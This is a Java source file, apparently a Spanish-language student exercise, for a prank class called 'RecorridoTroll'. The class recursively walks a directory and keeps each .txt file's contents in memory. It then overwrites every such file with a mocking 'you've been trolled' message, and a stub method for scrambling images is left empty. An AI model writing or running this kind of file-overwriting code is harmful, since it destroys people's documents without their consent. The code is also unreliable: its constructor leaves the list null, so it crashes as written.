package clases;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

import excepciones.NoEsImagenException;
import interfaces.InterfazTroll;

public class RecorridoTroll implements InterfazTroll {
	private ArrayList<ContenidoTxtOriginal> recorrido;

	public RecorridoTroll() {
		super();
		this.recorrido = recorrido;
	}

	public ArrayList<ContenidoTxtOriginal> getRecorrido() {
		return recorrido;
	}

	public void setRecorrido(ArrayList<ContenidoTxtOriginal> recorrido) {
		this.recorrido = recorrido;
	}

	public void recorridoTroll(File rutaInicial) {
		if (rutaInicial.isDirectory()) {
			File[] archivos = rutaInicial.listFiles();
			if (archivos != null) {
				for (File archivo : archivos) {
					if (archivo.isDirectory()) {
						recorridoTroll(archivo); // Recursivamente llamamos a recorridoTroll para el directorio
													// encontrado
					} else {
						if (esArchivoTxt(archivo)) {
							String nombreArchivo = archivo.getName();
							String contenidoArchivo = obtenerContenidoArchivo(archivo);
							ContenidoTxtOriginal contenidoTxt = new ContenidoTxtOriginal(nombreArchivo,
									contenidoArchivo);
							recorrido.add(contenidoTxt);
							sustituirContenidoArchivo(archivo);
						}
					}
				}
			}
		}
	}

	public void trastocarImagen(File rutaInicial) throws NoEsImagenException {
		// Implementación de trastocarImagen
	}

	private boolean esArchivoTxt(File archivo) {
		String nombreArchivo = archivo.getName();
		return nombreArchivo.toLowerCase().endsWith(".txt");
	}

	private String obtenerContenidoArchivo(File archivo) {
		StringBuilder contenido = new StringBuilder();
		try (BufferedReader br = new BufferedReader(new FileReader(archivo))) {
			String linea;
			while ((linea = br.readLine()) != null) {
				contenido.append(linea).append("\n");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return contenido.toString();
	}

	private void sustituirContenidoArchivo(File archivo) {
		try (BufferedWriter bw = new BufferedWriter(new FileWriter(archivo))) {
			bw.write("Te han troleado este contenido. El único remedio es usar Ajo y Agua");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
